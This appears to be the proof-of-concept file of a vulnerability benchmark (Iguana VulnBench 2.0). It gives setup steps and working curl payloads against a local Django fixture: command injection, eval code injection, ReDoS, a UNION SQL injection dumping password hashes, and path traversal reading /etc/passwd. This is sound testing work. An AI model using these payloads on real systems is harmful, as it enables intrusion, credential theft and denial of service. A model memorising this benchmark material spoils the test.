# Iguana VulnBench 2.0 proof of concepts

Run these commands only against a disposable local instance of this fixture. All payloads below
were verified against the project source on 2026-08-18/19.

## Local setup

From the benchmark repository root, build and start the application:

```sh
docker build -t iguana-local/iguana -f fixtures/app-project-iguana/project/Dockerfile \
  fixtures/app-project-iguana/project
docker run -d --name iguana-app -p 8000:8000 \
  -e APP_DIR=/iguana -e FILES_DIR=/files -e PUID=1000 -e PGID=1000 \
  -e VARIANT=development -e USE_NGINX=false -e TZ=UTC -e LANG=en-us \
  iguana-local/iguana
```

The application is at `http://localhost:8000`. It uses a file-backed email backend, so retrieve
activation links with `docker exec iguana-app sh -c "cat /files/emails/*.log"`.

Register a user through `POST /sign_up/` after fetching a CSRF cookie from `GET /sign_up/`;
`captcha_0=dummy&captcha_1=PASSED` is accepted in this fixture's development settings. Follow
the activation link, then log in through `POST /login/` after fetching its CSRF cookie. Create a
project with short name `TP` at `/project/create/`. The examples use `pocuser` /
`Pocpassword123` and a cookie jar named `cookies.txt`.

## 1. Command injection — repository test-connection (new)

`RepositoryTestConnectionView` (`gitintegration/views.py`) reads `url` straight off
`request.POST` and passes it to `Frontend.test_connection()`
(`subprocess.check_output('git ls-remote ' + url, shell=True)`) with **no form/model binding**
— it never goes through `RepositoryCreateForm`, so `validate_local_path`'s scheme allowlist
never runs. (Confirmed separately: an `ext::sh -c ...` payload against the *actual*
clone-on-save path **is** blocked by that validator — this finding is scoped to the new
test-connection endpoint specifically, not the pre-existing clone path.)

```sh
CSRF=$(grep csrftoken cookies.txt | tail -1 | awk '{print $NF}')
curl -sS -b cookies.txt -X POST http://localhost:8000/project/TP/repository/test/ \
  -H "Referer: http://localhost:8000/project/TP/repository/create/" \
  --data-urlencode "url=http://x; id > /tmp/pwned_ci 2>&1; echo x" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF"

docker exec iguana-app cat /tmp/pwned_ci
```

Confirmed outcome: `uid=1000(iguana) gid=1000(iguana) groups=1000(iguana)` — real command
execution as the app's (non-root) container user.

## 2. ReDoS — direct sample (new, `TestPatternView`)

`search/views.py::TestPatternView` runs `re.match(pattern, sample)` with both values taken
directly from the request body, no timeout or length limit.

```sh
CSRF=$(grep csrftoken cookies.txt | tail -1 | awk '{print $NF}')
curl -sS -b cookies.txt -X POST http://localhost:8000/search/testpattern/ \
  -H "Referer: http://localhost:8000/search/" \
  --data-urlencode "pattern=(a+)+\$" \
  --data-urlencode "sample=$(python3 -c "print('a'*35 + '!')")" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" --max-time 10
```

The sample must end in a character the pattern can't match (here `!`) to trigger catastrophic
backtracking — a pure run of `a`s (e.g. `'a'*35` with no trailing character) matches `(a+)+$`
on the first attempt with no backtracking at all and returns instantly. This was confirmed
directly: `re.match(r'(a+)+$', 'a'*35)` returns in 0.0001s, while the same pattern against
`'a'*35 + '!'` still hasn't returned after 8+ seconds.

Confirmed outcome: request hung past the 10s client timeout; the single-threaded dev server
was unresponsive to unrelated requests for 30+ seconds afterward. **Required
`docker restart iguana-app`** to recover (session/login state survived — SQLite persists on the
bind-mounted `/files` volume).

## 3. ReDoS — search DSL `~` operator against stored data (pre-existing, not planted)

The advanced search DSL's `~` comparator maps to Django's `__regex` ORM lookup
(`comparatorToQExpression` in `search/parser.py`), evaluated against **existing stored field
values** when `SearchFrontend.query()` (`search/frontend.py`) calls `.filter(expr)` — not
against an attacker-supplied sample like `TestPatternView`. This means the hang only manifests
once a sufficiently long/malicious value is actually stored; a short, unrelated title does not
trigger it.

This fixture ships no seed data — create a short-titled issue first (the app has no default
issues), then run a control query against it to prove the operator genuinely executes:

```sh
CSRF=$(grep csrftoken cookies.txt | tail -1 | awk '{print $NF}')
curl -sS -b cookies.txt -X POST http://localhost:8000/project/TP/issue/create/ \
  -H "Referer: http://localhost:8000/project/TP/issue/create/" \
  --data-urlencode "title=Fix login bug" --data-urlencode "description=control issue" \
  --data-urlencode "kanbancol=1" --data-urlencode "type=Bug" \
  --data-urlencode "priority=0" --data-urlencode "storypoints=1" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF"

CSRF=$(grep csrftoken cookies.txt | tail -1 | awk '{print $NF}')
curl -sS -b cookies.txt -X POST http://localhost:8000/search/result/ \
  -H "Referer: http://localhost:8000/search/" \
  --data-urlencode 'expression=Issue.title ~ "^Fix"' \
  --data-urlencode "csrfmiddlewaretoken=$CSRF"
```

Confirmed: matched "Fix login bug" correctly, in ~50ms.

First attempt at the actual ReDoS payload against that same short title returned normally in
0.053s with "no items matching" — no catastrophic backtracking, because `(a+)+$` only blows up
against strings shaped like a long run of `a`s. Planting a matching stored value first:

```sh
CSRF=$(grep csrftoken cookies.txt | tail -1 | awk '{print $NF}')
TITLE=$(python3 -c "print('a'*90 + '!')")
curl -sS -b cookies.txt -X POST http://localhost:8000/project/TP/issue/create/ \
  -H "Referer: http://localhost:8000/project/TP/issue/create/" \
  --data-urlencode "title=$TITLE" --data-urlencode "description=redos poc" \
  --data-urlencode "kanbancol=1" --data-urlencode "type=Bug" \
  --data-urlencode "priority=0" --data-urlencode "storypoints=1" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF"

curl -sS -b cookies.txt -X POST http://localhost:8000/search/result/ \
  -H "Referer: http://localhost:8000/search/" \
  --data-urlencode 'expression=Issue.title ~ "(a+)+$"' \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" --max-time 15
```

Confirmed outcome: request timed out with zero bytes received after 15s (`curl: (28)
Operation timed out`), proving the hang against realistic, attacker-plantable stored data.
**Required `docker restart iguana-app`** to recover. Delete the crafted issue from the local
database after reproducing the behavior.

## 4. SQL injection — issue search (new)

`issue/search.py::search_issues()` formats the `q` parameter directly into a raw SQL query run
via `django.db.connection.cursor()`. The query only selects 3 columns (`id, number, title`) and
wraps the search term inside `(title LIKE '%<q>%' OR description LIKE '%<q>%')` — the payload
below closes both the quote and that parenthesis before opening the `UNION SELECT`, matches the
3-column shape, and comments out the trailing, still-templated second occurrence of `<q>` with
`-- `. The real user table is `user_management_customuser` (Django's default `auth_user` is not
used here — this app ships a custom user model).

```sh
curl -sS -b cookies.txt "http://localhost:8000/project/TP/issue/search/?q=login"
# control: {"issues": [{"id": 1, "number": 1, "title": "Fix login bug"}]}

curl -sS -b cookies.txt --get "http://localhost:8000/project/TP/issue/search/" \
  --data-urlencode "q=%') UNION SELECT id, id, username || ':' || password FROM user_management_customuser -- "
```

Confirmed outcome: returned a row containing the `pocuser` account's stored username and
password hash concatenated into the `title` field — data the issue-search feature was never
meant to expose, obtained by breaking out of the intended keyword filter with a UNION
injection.

## 5. Code injection — issue filter (new)

`issue/views.py::IssueFilterView` evaluates the caller-supplied `expression` with `eval()`,
passing only a local context dict (`title`, `description`) with no builtins restriction.

```sh
curl -sS -b cookies.txt --get "http://localhost:8000/project/TP/issue/filter/" \
  --data-urlencode "expression=title == 'nonexistent'"
# control: {"issues": []}

curl -sS -b cookies.txt --get "http://localhost:8000/project/TP/issue/filter/" \
  --data-urlencode 'expression=__import__("os").system("id > /tmp/pwned_filter 2>&1") == 0'
docker exec iguana-app cat /tmp/pwned_filter
```

Confirmed outcome: `uid=1000(iguana) gid=1000(iguana) groups=1000(iguana)` — real code
execution via `eval()`.

## 6. Path traversal — timelog CSV export (new)

`project/export.py::read_export()` joins a request-controlled `filename` onto the project's
export directory with no containment check. Visit `/project/TP/timelog/` once first to generate
the CSV snapshot via `write_export()`.

```sh
curl -sS -b cookies.txt "http://localhost:8000/project/TP/timelog/export/?filename=timelog.csv"
# control: real CSV content

curl -sS -b cookies.txt --get "http://localhost:8000/project/TP/timelog/export/" \
  --data-urlencode "filename=../../../../../../etc/passwd"
```

Confirmed outcome: returned the real contents of the container's `/etc/passwd`.
